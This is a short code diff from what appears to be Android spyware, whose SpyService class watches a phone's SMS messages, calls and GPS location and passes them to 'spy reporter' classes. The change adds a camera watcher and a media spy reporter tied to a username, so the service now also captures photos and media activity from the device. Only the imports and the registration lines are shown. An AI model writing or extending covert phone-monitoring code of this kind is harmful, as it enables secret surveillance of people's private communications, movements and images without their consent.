@@ -5,8 +5,10 @@ import org.ddth.android.monitor.core.AndroidDC;
 import org.ddth.android.monitor.observer.AndroidCallWatcher;
 import org.ddth.android.monitor.observer.AndroidGpsWatcher;
 import org.ddth.android.monitor.observer.AndroidSmsWatcher;
+import org.ddth.android.monitor.observer.AndroidCameraWatcher;
 import org.ddth.android.spy.reporter.CallSpyReporter;
 import org.ddth.android.spy.reporter.GpsSpyReporter;
+import org.ddth.android.spy.reporter.MediaSpyReporter;
 import org.ddth.android.spy.reporter.SmsSpyReporter;
 import org.ddth.android.spy.reporter.SpyReporter;
 import org.ddth.http.core.Logger;
@@ -39,6 +41,8 @@ public class SpyService extends AndroidRegisteringService {
 			new AndroidSmsWatcher(new SmsSpyReporter()),
 			// I want to monitor Call activities
 			new AndroidCallWatcher(new CallSpyReporter()),
+			// I want to monitor Media activities
+			new AndroidCameraWatcher(new MediaSpyReporter(username)),
 			// I want to bring up configuration dialog
 			new SpyingConfiguratingWatcher()
 		};
